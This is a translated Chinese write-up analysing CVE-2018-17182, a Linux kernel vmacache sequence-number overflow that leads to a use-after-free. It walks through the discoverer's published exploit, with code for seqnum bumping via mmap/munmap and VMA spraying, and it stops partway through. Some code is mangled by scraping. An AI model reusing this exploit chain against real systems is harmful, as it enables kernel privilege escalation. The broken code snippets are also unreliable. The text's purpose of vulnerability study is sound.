# CVE-2018-17182 VMA use-after-free 详解
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 漏洞分析
内核在3.16版本之后对vma的查找进行了优化:
###  新的vma缓存机制
在task_struct中加入了一个vmacache数组和一个32位的vmacache_seqnum值。在mm_struct结构中加入了一个32位vmacache_seqnum值，并且在此基础上定义了一系列操作函数  
vmacache_invalidate函数，用来将mm_struct的vmacache_seqnum加一，使其不等于当前线程的current->vmacache_seqnum。  
vmacache_find  
更新了vma_find函数，在这个位置会调用vmacache_find  
vmacache_find  
vmacache_find检索当前线程的vmacache缓存数组，如果地址范围在其中某一个vma的地址范围中，直接返回这个vma，不需要再进行红黑树检索  
vmacache_find还会调用vmacache_valid，在其中会检查current->vmacache_seqnum是否等于current->mm->vmacache_seqnum，如果之前有过调用vmacache_invalidate，在这里会直接去调用vmacache_flush函数，刷新task_struct的vmacache链表之后会返回null。  
###  漏洞具体位置
但是这个32位的值是可以被溢出的，于是在vmacache_invalidate中会有溢出的检查，如果回到0，就会刷新vmacache缓存数组。  
本来这套机制是没有问题的，但是溢出后每次刷新线程的vmacache数组都需要遍历所有线程，太耗费时间  
于是又发布了一次新的更新，如果是单线程的话不用对其刷新，直接返回。  
但是这样就存在一个问题，如果在溢出之后，在调用vmacache_valid之前，立即申请一个新线程。这个时候之前的单线程的current->vmacache_seqnum仍然为0xffffffff，并没有更新为0。因为线程虽然没一个线程都有一个单独的task_struct，但是是共享同一个mm_struct的，这个时候在另一个新创建的线程之中将mm_struct的seqnum刷新为0xffffffff，在先前的但线程中就可以利用其vmacache数组里面已经释放了的vma，实现use
after free。
我们再来看看mmap和munmap函数是如何改变seqnum的值。  
也就是说，调用munmap去解除vma映射的时候，会调用vmacache_invalidate将相应的mm_struct的seqnum增加1。并且最后会调用  
kmem_cache_free(vm_area_cachep, vma)将对应的vm_area_struct free掉使其回到slab分配器的free
list。
并且再mummap开始的时候会调用find_vma，这会更新vmacache或者是刷新它。  
再来看mmap函数：在其中会调用mmap_region,然后调用  
其中会调用vm_area_alloc，在其中调用kmem_cache_zalloc()。这个函数主要用于向内核的slab分配器分配专门大小的object。
## 漏洞利用
现在我们结合着漏洞发现者在github上贴出的具体的漏洞利用代码去分析一下具体的利用过程。
漏洞利用代码
我们首先将作者的代码定义的每个函数具体功能进行分析，之后结合漏洞进行总体的串联
漏洞发现者的利用代码实现了一套ioctl系统来辅助漏洞的利用,其中关键的cmd是DMESG_DUMP用来调用vmacache_debug_dump()实现dump当前mm结构的信息，SEQUENCE_BUMP，用来更新当前线程mm_struct的seqnum。
      case DMESG_DUMP: {
      vmacache_debug_dump();
      return 0;
    } break;
    case SEQUENCE_BUMP: {
      current->mm->vmacache_seqnum += arg;
      return 0;
    } break;`
vmacache_debug_dump():
    void vmacache_debug_dump(void)
    {
     struct mm_struct *mm = current->mm;
     struct task_struct *g, *p;
     int i;
     pr_warn("entering     vmacache_debug_dump(0x%lx)n", (unsigned long)mm);
     pr_warn("  mm sequence: 0x%xn", mm->vmacache_seqnum);
     rcu_read_lock();
     for_each_process_thread(g, p) {
       if (mm == p->mm) {
         pr_warn("  task 0x%lx at 0x%x%sn", (unsigned long)p,
       p->vmacache.seqnum,
       (current == p)?" (current)":"");
     pr_warn("    cache dump:n");
     for (i=0; ivmacache.vmas[i]);
       err |= probe_kernel_read(&vm_start,
         &p->vmacache.vmas[i]->vm_start,
         sizeof(unsigned long));
       err |= probe_kernel_read(&vm_end,
         &p->vmacache.vmas[i]->vm_end,
         sizeof(unsigned long));
       err |= probe_kernel_read(&vm_mm,
         &p->vmacache.vmas[i]->vm_mm,
         sizeof(unsigned long));
       if (err)
         continue;
       pr_warn("        start=0x%lx end=0x%lx mm=0x%lxn",
         vm_start, vm_end, vm_mm);
         }
       }
     }
再看puppet.c  
首先我们有一个全局变量sequence_mirror，用于标记mm_struct的seqnum的值
    static void sequence_double_inc(void) {
        mmap(FAST_WRAP_AREA + PAGE_SIZE, PAGE_SIZE, PROT_RW, MAP_PRIV_ANON|MAP_FIXED, -1, 0);
        sequence_mirror += 2;
    }
    static void sequence_inc(void) {
        mmap(FAST_WRAP_AREA, PAGE_SIZE, PROT_RW, MAP_PRIV_ANON|MAP_FIXED, -1, 0);
        sequence_mirror += 1;
    }
这两个函数分别用于将mm_struct->vmacache_seqnum的值分别增加2和1。具体的原理是
首先在main函数中创建一个三个页的匿名映射。之后通过带有MAP_FIXED的mmap去申请第一页或者中间页的映射。如果是中间页，则会munmap开头和结尾两页，造成seqnum的两次递增。之后再进行合并。同理，开头一页的话则会造成一次递增。
    static void sequence_target(long target) {
        while (sequence_mirror + 2 vmacache_seqnum。
之后在不创建线程的前提下先将mm的seqnum更新为0x100000000L – VMA_SPAM_COUNT/2
    sequence_cheat_bump(0xffff0000L);
    sequence_target(0x100000000L - VMA_SPAM_COUNT/2);
之后我们申请5000个mmap映射，根据之前的分析，在slab分配器中也分配了5000个vm_area_struct。
    for (unsigned long i=0; ivmacache_seqnum已经被溢出变成了0。而且current->vmacache缓存数组保存着我们最后一次mummap所释放的vma结构。由于是但线程，所以并没有flush
vmacache数组给了我们use after free的条件。
    for (unsigned long i=0; i<VMA_SPAM_COUNT/2; i++) {
        munmap_noadjacent(VMA_SPAM_AREA + i * VMA_SPAM_DELTA, PAGE_SIZE);
    }
之后，我们在没有调用任何vma_find的情况下，马上申请新的线程，在新线程中：  
我们首先munmap掉5000个映射，也就是释放了5000个vma struct，这样，我们会将整个的vma slab全部变成free，从而将这个slab
释放回伙伴系统。
    for (unsigned long i=VMA_SPAM_COUNT/2; i<VMA_SPAM_COUNT; i++) {
        munmap_noadjacent(VMA_SPAM_AREA + i * VMA_SPAM_DELTA, PAGE_SIZE);